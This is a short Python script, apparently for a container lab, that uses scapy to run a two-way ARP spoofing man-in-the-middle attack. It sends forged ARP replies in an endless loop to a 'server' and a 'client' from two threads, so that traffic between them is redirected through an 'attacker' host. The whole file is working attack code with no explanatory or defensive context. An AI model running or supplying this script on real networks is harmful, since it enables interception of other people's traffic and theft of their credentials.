from scapy.all import *
import threading


def arp_spoof(hwdst: str, pdst: str, hwsrc: str, psrc: str, inter: int = 0.1) -> None:
    eth = Ether()
    arp = ARP(
        op='is-at',

        hwsrc=hwsrc,
        psrc=psrc,

        hwdst=hwdst,
        pdst=pdst
    )

    pkt = eth/arp

    sendp(pkt, iface='eth0', loop=1, inter=inter)


ATTACKER_MAC = '02:42:ac:11:00:02'
ATTACKER_IP = '172.17.0.2'

GATEWAY_IP = '172.17.0.1'

SERVER_MAC = '02:42:ac:11:00:03'
SERVER_IP = '172.17.0.3'

CLIENT_MAC = '02:42:ac:11:00:04'
CLIENT_IP = '172.17.0.4'

server_arp_spoof_thread = threading.Thread(
    target=arp_spoof,
    args=(
        SERVER_MAC,
        SERVER_IP,
        ATTACKER_MAC,
        CLIENT_IP,
        0.1
    )
)

client_arp_spoof_thread = threading.Thread(
    target=arp_spoof,
    args=(
        CLIENT_MAC,
        CLIENT_IP,
        ATTACKER_MAC,
        SERVER_IP,
        0.1
    )
)

server_arp_spoof_thread.start()
client_arp_spoof_thread.start()
